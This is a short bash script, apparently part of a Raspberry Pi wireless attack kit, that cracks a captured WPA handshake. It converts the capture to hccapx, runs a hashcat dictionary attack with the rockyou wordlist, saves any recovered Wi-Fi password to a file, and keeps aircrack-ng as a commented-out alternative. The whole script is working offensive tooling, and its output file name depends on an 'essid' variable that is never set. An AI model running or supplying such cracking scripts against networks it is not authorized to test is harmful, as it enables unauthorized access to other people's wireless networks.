#!/bin/bash

echo 'bruteforcing WPA'
HOME='/home/pi'

/usr/lib/hashcat-utils/cap2hccapx.bin "$1" "$1.hccapx"
before=$(wc -l $HOME/.hashcat/hashcat.potfile | cut -d ' ' -f 1)
xterm -e "hashcat --force -a 0 -m 2500 '$1.hccapx' /usr/share/wordlists/rockyou.txt"
after=$(wc -l $HOME/.hashcat/hashcat.potfile | cut -d ' ' -f 1)
if [ $after -gt $before ]; then
	tail -n 1 $HOME/.hashcat/hashcat.potfile | awk 'BEGIN {FS=":"};{print $NF}' > "$HOME/karma/handshakes/${essid}.txt"
fi

#xterm -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt '$1'; read"
